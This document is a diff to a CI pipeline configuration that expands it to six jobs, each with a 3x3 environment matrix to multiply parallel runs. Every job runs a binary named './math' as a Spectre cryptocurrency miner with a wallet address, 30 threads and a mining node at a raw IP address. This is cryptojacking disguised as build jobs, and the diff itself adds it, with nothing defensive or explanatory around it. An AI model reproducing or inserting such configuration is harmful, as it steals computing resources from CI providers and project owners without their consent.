@@ -11,18 +11,56 @@ blocks:
     task:
       jobs:
         - name: 'Job #1'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
           commands:
-            - checkout
+            - echo FOO=$FOO BAR=$BAR
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
         - name: 'Job #2'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
           commands:
-            - checkout
+            - echo FOO=$FOO BAR=$BAR
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
         - name: 'Job #3'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
           commands:
-            - checkout
-            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address34.82.41.54'
+            - echo FOO=$FOO BAR=$BAR
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54 '
         - name: 'Job #4'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
           commands:
-            - checkout
+            - echo FOO=$FOO BAR=$BAR
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
+        - name: 'Job #5'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
+          commands:
+            - echo FOO=$FOO BAR=$BAR
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
+        - name: 'Job #6'
+          matrix:
+          - env_var: FOO
+            values: [ "A", "B", "C" ]
+          - env_var: BAR
+            values: [ "1", "2", "3" ]
+          commands:
+            - echo FOO=$FOO BAR=$BAR
             - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
